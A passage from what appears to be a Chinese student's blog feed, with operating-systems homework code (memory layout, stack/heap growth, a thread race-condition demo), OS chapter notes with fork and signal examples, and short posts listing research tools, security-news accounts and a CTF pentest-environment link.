class="params">()</span> {}             <span class="comment">// 代码段</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">show_addr</span><span class="params">(<span class="type">void</span>* arg)</span> {</span><br><span class="line">    <span class="type">int</span> thread_id = *(<span class="type">int</span>*)arg;</span><br><span class="line">    <span class="type">int</span> local_var = <span class="number">20</span>;           <span class="comment">// 栈</span></span><br><span class="line">    <span class="type">int</span>* heap_var = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));  <span class="comment">// 堆</span></span><br><span class="line">    *heap_var = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n===== 线程 %d 的地址空间分布 =====\n"</span>, thread_id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"代码段地址（函数 code_func） ：%p\n"</span>, (<span class="type">void</span>*)code_func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"只读数据段地址（const_global）：%p\n"</span>, (<span class="type">void</span>*)&amp;const_global);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"数据段地址（global_var）      ：%p\n"</span>, (<span class="type">void</span>*)&amp;global_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆区地址（malloc 分配）       ：%p\n"</span>, (<span class="type">void</span>*)heap_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈区地址（local_var）         ：%p\n"</span>, (<span class="type">void</span>*)&amp;local_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 展示堆区共享验证（修改堆区数据）</span></span><br><span class="line">    *heap_var += thread_id;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"线程 %d 修改堆区数据后值为：%d\n"</span>, thread_id, *heap_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 稍作等待以便输出交错显示</span></span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">    <span class="built_in">free</span>(heap_var);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"作业二第二部分：进程地址空间布局分析\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"主线程开始创建两个子线程...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> tid1, tid2;</span><br><span class="line">    <span class="type">int</span> id1 = <span class="number">1</span>, id2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;tid1, <span class="literal">NULL</span>, show_addr, &amp;id1);</span><br><span class="line">    pthread_create(&amp;tid2, <span class="literal">NULL</span>, show_addr, &amp;id2);</span><br><span class="line"></span><br><span class="line">    pthread_join(tid1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n所有线程执行完毕。\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>任务三：堆栈内容展示与分析</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子线程函数：分析堆栈空间布局与增长方向</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span> {</span><br><span class="line">    <span class="type">int</span> thread_id = *(<span class="type">int</span>*)arg;</span><br><span class="line">    <span class="type">int</span> stack_var1, stack_var2;             <span class="comment">// 栈变量</span></span><br><span class="line">    <span class="type">int</span> *heap_var1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));   <span class="comment">// 堆变量1</span></span><br><span class="line">    <span class="type">int</span> *heap_var2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));   <span class="comment">// 堆变量2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n===== 线程 %d 堆栈分析 =====\n"</span>, thread_id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 栈分析</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【栈分析】\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈变量 1 地址: %p\n"</span>, (<span class="type">void</span>*)&amp;stack_var1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈变量 2 地址: %p\n"</span>, (<span class="type">void</span>*)&amp;stack_var2);</span><br><span class="line">    <span class="keyword">if</span> (&amp;stack_var1 &gt; &amp;stack_var2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈空间向低地址方向增长\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈空间向高地址方向增长（非典型情况）\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 堆分析</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【堆分析】\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆变量 1 地址: %p\n"</span>, (<span class="type">void</span>*)heap_var1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆变量 2 地址: %p\n"</span>, (<span class="type">void</span>*)heap_var2);</span><br><span class="line">    <span class="keyword">if</span> (heap_var1 &lt; heap_var2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 堆空间向高地址方向增长\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 堆空间向低地址方向增长（非典型情况）\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较堆栈的相对位置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【总体比较】\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span>*)&amp;stack_var1 &gt; (<span class="type">void</span>*)heap_var1)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈区地址高于堆区地址（符合一般内存分布规律）\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈区与堆区分布异常，需注意系统实现差异\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(heap_var1);</span><br><span class="line">    <span class="built_in">free</span>(heap_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"作业二第三部分：堆栈内容展示与分析\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> main_stack1, main_stack2;          <span class="comment">// 主线程栈变量</span></span><br><span class="line">    <span class="type">int</span> *main_heap1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)); <span class="comment">// 主线程堆变量1</span></span><br><span class="line">    <span class="type">int</span> *main_heap2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)); <span class="comment">// 主线程堆变量2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n===== 主线程堆栈分析 =====\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 栈分析</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【栈分析】\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈变量 1 地址: %p\n"</span>, (<span class="type">void</span>*)&amp;main_stack1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"栈变量 2 地址: %p\n"</span>, (<span class="type">void</span>*)&amp;main_stack2);</span><br><span class="line">    <span class="keyword">if</span> (&amp;main_stack1 &gt; &amp;main_stack2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈空间向低地址方向增长\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 堆分析</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【堆分析】\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆变量 1 地址: %p\n"</span>, (<span class="type">void</span>*)main_heap1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"堆变量 2 地址: %p\n"</span>, (<span class="type">void</span>*)main_heap2);</span><br><span class="line">    <span class="keyword">if</span> (main_heap1 &lt; main_heap2)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 堆空间向高地址方向增长\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对比堆栈总体位置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"【总体比较】\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span>*)&amp;main_stack1 &gt; (<span class="type">void</span>*)main_heap1)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"→ 栈区地址高于堆区地址（符合一般规律）\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建两个线程对比堆栈空间</span></span><br><span class="line">    <span class="type">pthread_t</span> thread1, thread2;</span><br><span class="line">    <span class="type">int</span> id1 = <span class="number">1</span>, id2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;thread1, <span class="literal">NULL</span>, thread_function, &amp;id1);</span><br><span class="line">    pthread_create(&amp;thread2, <span class="literal">NULL</span>, thread_function, &amp;id2);</span><br><span class="line"></span><br><span class="line">    pthread_join(thread1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(thread2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(main_heap1);</span><br><span class="line">    <span class="built_in">free</span>(main_heap2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n所有线程堆栈分析完毕。\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>任务四：多线程修改共享变量结果展示与分析</p><p>（通过多次运行该程序，还会得到不同的最终结果，进一步验证了线程调度的随机性和操作结果的不确定性。）</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> shared_value = <span class="number">0</span>;  <span class="comment">// 共享变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程1：增加共享变量</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_add</span><span class="params">(<span class="type">void</span> *arg)</span> {</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) {</span><br><span class="line">        <span class="type">int</span> temp = shared_value;  <span class="comment">// 读取共享变量</span></span><br><span class="line">        usleep(rand() % <span class="number">2000</span>);    <span class="comment">// 随机延迟，增加调度随机性</span></span><br><span class="line">        temp = temp + <span class="number">1</span>;          <span class="comment">// 执行加操作</span></span><br><span class="line">        usleep(rand() % <span class="number">2000</span>);</span><br><span class="line">        shared_value = temp;      <span class="comment">// 写回共享变量</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"线程1(+1) 第%d次操作后: shared_value = %d\n"</span>, i + <span class="number">1</span>, shared_value);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程2：减少共享变量</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_sub</span><span class="params">(<span class="type">void</span> *arg)</span> {</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) {</span><br><span class="line">        <span class="type">int</span> temp = shared_value;  <span class="comment">// 读取共享变量</span></span><br><span class="line">        usleep(rand() % <span class="number">2000</span>);    <span class="comment">// 随机延迟，增加调度随机性</span></span><br><span class="line">        temp = temp - <span class="number">1</span>;          <span class="comment">// 执行减操作</span></span><br><span class="line">        usleep(rand() % <span class="number">2000</span>);</span><br><span class="line">        shared_value = temp;      <span class="comment">// 写回共享变量</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"线程2(-1) 第%d次操作后: shared_value = %d\n"</span>, i + <span class="number">1</span>, shared_value);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"作业二第四部分：多线程共享变量与调度随机性分析\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> t1, t2;</span><br><span class="line">    srand((<span class="type">unsigned</span>)time(<span class="literal">NULL</span>));  <span class="comment">// 初始化随机数种子</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"初始值: shared_value = %d\n"</span>, shared_value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建两个线程：一个加，一个减</span></span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, thread_add, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;t2, <span class="literal">NULL</span>, thread_sub, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待两个线程执行完毕</span></span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n所有操作结束。\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"最终值: shared_value = %d (理论期望值: 0)\n"</span>, shared_value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"说明：由于线程交替运行的随机性，结果可能与期望不同。\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>科研资料整理收集工具</title>
      <link href="/2025/10/16/%E7%A7%91%E7%A0%94%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2025/10/16/%E7%A7%91%E7%A0%94%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="🌟-1-好用的ai工具"><a href="#🌟-1-好用的ai工具" class="headerlink" title="🌟 1 好用的ai工具"></a>🌟 1 好用的ai工具</h2><p><a href="https://www.bohrium.com/journal-library">https://www.bohrium.com/journal-library</a></p><h2 id="🌟-2-翻译工具"><a href="#🌟-2-翻译工具" class="headerlink" title="🌟 2 翻译工具"></a>🌟 2 翻译工具</h2><p>英文翻译好用软件：小绿鲸</p><p>翻译插件：沉浸式翻译<br><a href="https://immersivetranslate.cn/">https://immersivetranslate.cn/</a></p><p>官网有使用教程，简单易安装，可以用于快速理解文章内容、筛选信息</p><h2 id="🌟-3-信息检索资料"><a href="#🌟-3-信息检索资料" class="headerlink" title="🌟 3 信息检索资料"></a>🌟 3 信息检索资料</h2><table><thead><tr><th align="left">微信公众号</th><th align="left">主要方向</th><th align="left">推荐程度及理由</th></tr></thead><tbody><tr><td align="left">安全研究GoSSIP</td><td align="left">智安领域，主要面向安全</td><td align="left"><strong>优</strong>，会推荐一些比较先进的论文</td></tr><tr><td align="left">Coder小Q</td><td align="left">密码领域</td><td align="left"><strong>一般</strong>，倾向于密码领域知识的科普</td></tr><tr><td align="left">苏州信息安全法学所</td><td align="left">网安、密码、法律</td><td align="left"><strong>一般</strong>，主要倾向于网安、密码和法律之间关系的解读及对当下的影响</td></tr><tr><td align="left">凰兮</td><td align="left">密码</td><td align="left"><strong>不推荐</strong>，近期注重对于经典密码算法的讲解</td></tr><tr><td align="left">黑客网络安全</td><td align="left">网安</td><td align="left"><strong>一般</strong>，主要是对网安人员和黑客的事迹介绍以及一些网络安全小技巧分享（通俗易懂）</td></tr><tr><td align="left">ACM计算机学会</td><td align="left">智安等与计算机相关的领域</td><td align="left"><strong>优</strong>，推荐各类计算机赛事信息和具有代表性的获奖论文</td></tr><tr><td align="left">中国信息安全</td><td align="left">智安</td><td align="left"><strong>一般</strong>，主要是聚焦相关政策介绍和专家解读</td></tr><tr><td align="left">XPTY</td><td align="left">密码</td><td align="left"><strong>一般</strong>，介绍各类优秀论文</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF竞赛资料整理</title>
      <link href="/2025/10/16/CTF%E7%AB%9E%E8%B5%9B%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"/>
      <url>/2025/10/16/CTF%E7%AB%9E%E8%B5%9B%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="🌟-1-好用的攻击机镜像资源连接"><a href="#🌟-1-好用的攻击机镜像资源连接" class="headerlink" title="🌟 1 好用的攻击机镜像资源连接"></a>🌟 1 好用的攻击机镜像资源连接</h2><p><a href="https://arch3rpro.github.io/download">矛盾武器库</a></p><p>矛·盾 武器库 v3.2<br>Pentest-Windows<br>一个开箱即用的windows渗透测试环境<br>首个适配Mac M芯片的武器库</p><hr><p>本文档会持续更新，谢谢关注～</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校园资料整理</title>
      <link href="/2025/10/16/%E6%A0%A1%E5%9B%AD%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"/>
      <url>/2025/10/16/%E6%A0%A1%E5%9B%AD%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="🌟-1-大创项目经费使用及报销流程"><a href="#🌟-1-大创项目经费使用及报销流程" class="headerlink" title="🌟 1 大创项目经费使用及报销流程"></a>🌟 1 大创项目经费使用及报销流程</h2><p>通过网盘分享的文件：“大创项目”经费使用及报销流程(2025).doc<br>链接: <a href="https://pan.baidu.com/s/1gciprfjrG1TLMQLIPXLNEw?pwd=xub3">https://pan.baidu.com/s/1gciprfjrG1TLMQLIPXLNEw?pwd=xub3</a> 提取码: xub3<br>–来自百度网盘超级会员v5的分享</p><hr><p>本文档会持续更新</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统章节笔记</title>
      <link href="/2025/10/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/10/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="🌲操作系统章节复习"><a href="#🌲操作系统章节复习" class="headerlink" title="🌲操作系统章节复习"></a>🌲操作系统章节复习</h1><h2 id="🌟-第一章基础知识"><a href="#🌟-第一章基础知识" class="headerlink" title="🌟 第一章基础知识"></a>🌟 第一章基础知识</h2><ol><li>OS作为用户与计算机硬件系统之间的接口。OS处于用户和计算机硬件系统之间，用户通过OS来使用计算机系统。用户可以通过以下三种方式使用计算机：命令行；系统调用；图形化</li><li>OS的定义：操作系统是一组控制和管理计算机硬件和软件资源，合理地对各类作业进行调度，以及方便用户使用的程序的集合</li><li>关于操作系统的比喻：魔术师，提供干净、易于使用的物理资源抽象，应用程序的“机器”是由操作系统提供的进程抽象，每个正在运行的程序都在它自己的进程中运行，进程提供了比原始硬件更好的接口。裁判，管理保护、隔离和资源共享，操作系统相互隔离各个过程，操作系统将自己与其他过程隔离开来，即使它们实际上是运行在相同的硬件上！胶水，常见的服务：存储，窗口系统，网络，共享和授权，外观和感觉</li><li>进程：进程是进程实体的运行过程，是系统进行资源分配和调度的一个独立单位。进程是程序的一次执行，进程是一个程序及数据在处理机上顺序执行时所发生的活动。进程=地址空间+线程+与之关联的其他系统状态</li><li>操作系统的发展过程：无操作系统的计算机系统、单道批处理系统、多道批处理系统、分时系统、实时系统。多道批处理系统是操作系统成熟的标志。</li><li>分时系统的特征：多路性、独占性、及时性、交互性</li><li>操作系统的基本特征：并发性、共享性、虚拟性、异步性</li><li>共享：系统中的资源可供内存中多个并发执行的进程共同使用，相应地把这种资源共同使用称为资源共享或称为资源复用。</li><li>临界资源：在一段时间内只允许一个进程访问的资源</li><li>并发和共享是操作系统的两个最基本特征，他们又是互为存在的条件。</li><li>虚拟技术：操作系统中所谓的虚拟，是指通过某种技术把一个物理实体变为若干个逻辑上的对应物。物理实体是实的，即实际存在的，后者是虚的，是用户感觉上的东西。用于实现虚拟的技术称为虚拟技术。</li><li><strong>操作系统的主要功能</strong>：（1）处理机管理功能：进程控制、进程同步、进程通信、调度（2）存储器管理功能：对内存进行分配、保护和扩充、地址映射 （3）设备管理功能：缓冲管理、设备分配、设备处理 （4）文件管理功能：文件存储空间的管理、目录管理、文件的读写管理和保护 （5）操作系统与用户之间的接口：用户接口和程序接口</li></ol><hr><h2 id="🌟-第二章-进程、线程与文件系统"><a href="#🌟-第二章-进程、线程与文件系统" class="headerlink" title="🌟 第二章 进程、线程与文件系统"></a>🌟 第二章 进程、线程与文件系统</h2><h3 id="2-1-四个操作系统基本概念"><a href="#2-1-四个操作系统基本概念" class="headerlink" title="2.1 四个操作系统基本概念"></a>2.1 四个操作系统基本概念</h3><ol><li>线程：单个唯一执行上下文（PC寄存器、数据寄存器、执行标志、堆栈、内存状态）。当线程驻留在处理器寄存器中时，它是在处理器上执行的。当状态未被加载到处理器时，线程被挂起（不执行） ，处理器状态指向其他线程，程序计数器不指向此线程的下一个指令。线程是虚拟内核，时分复用，线程在真正的物理核心，或保存在内存块中（线程控制块TCB），TCB在线程不运行时保留寄存器的内容，TCB现在存储在内核</li><li>地址空间：程序可访问的一组内存地址（用于读取或写入）保护操作系统免受程序攻击：base&amp;bound，重定位，地址空间转换，分页虚拟地址空间</li><li>进程：运行程序的实例（受保护的地址空间+一个或多个线程）权利受限的执行环境，具有一个或者多个线程，拥有内存、文件描述符、套接字，封装一个或多个线程共享过程资源，提供内存保护。线程封装并发，地址空间封装保护，并行性</li><li>双模式操作保护：只有系统才有能力访问某些资源 内核态/用户态 管态/目态。用户内核模式转换：系统调用fopen、中断（硬件触发，如时钟中断、键盘操作）、陷入或异常</li><li>code：代码段，程序的可执行指令，编译后的二进制代码 static data：数据段，已初始化的全局变量和静态变量（如 <code>int global_var = 42;</code>）未初始化的全局/静态变量（BSS段，默认值为0，如 <code>static int uninit_var;</code>） heap：堆，通过malloc或者new等动态分配的内存，如运行时创建的数组、对象、数据结构 stack：栈，函数调用的上下文，局部变量、函数参数、返回地址等</li></ol><h3 id="2-2-并发进程与线程"><a href="#2-2-并发进程与线程" class="headerlink" title="2.2 并发进程与线程"></a>2.2 并发进程与线程</h3><p><img src="/../../../../aimgs/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AB%A0%E8%8A%82%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="虚拟地址空间"></p><ol><li><strong>并发</strong>：多处理器：多个CPU（核心），多道：多个作业/进程，多线程：多个线程/进程</li><li>并发性是同时处理多件事情，并行是同时做多件事情</li><li>进程管理API：exit终止进程 fork复制当前进程 exec更改当前进程运行的程序 wait等待进程完成 kill向其他进程发送信号（中断式通知） sigaction为信号设置处理程序</li><li>基础代码：</li></ol><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* get current processes PID */</span></span><br><span class="line">  <span class="type">pid_t</span> pid = getpid();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"My pid: %d\n"</span>, pid);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> {</span><br><span class="line">  <span class="type">pid_t</span> cpid, mypid;</span><br><span class="line">  <span class="type">pid_t</span> pid = getpid();            <span class="comment">/* get current processes PID */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Parent pid: %d\n"</span>, pid);</span><br><span class="line">  cpid = fork();</span><br><span class="line">  <span class="keyword">if</span> (cpid &gt; <span class="number">0</span>) {     <span class="comment">/* Parent Process */</span></span><br><span class="line">    mypid = getpid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] parent of [%d]\n"</span>, mypid, cpid);</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (cpid == <span class="number">0</span>) {     <span class="comment">/* Child Process */</span></span><br><span class="line">    mypid = getpid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] child\n"</span>, mypid);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    perror(<span class="string">"Fork failed"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_callback_handler</span><span class="params">(<span class="type">int</span> signum)</span> {</span><br><span class="line">  <span class="built_in">printf</span>(“Caught signal!\n”);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>;</span></span><br><span class="line">  sa.sa_flags = <span class="number">0</span>;</span><br><span class="line">  sigemptyset(&amp;sa.sa_mask);</span><br><span class="line">  sa.sa_handler = signal_callback_handler;</span><br><span class="line">  sigaction(SIGINT, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) {}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol 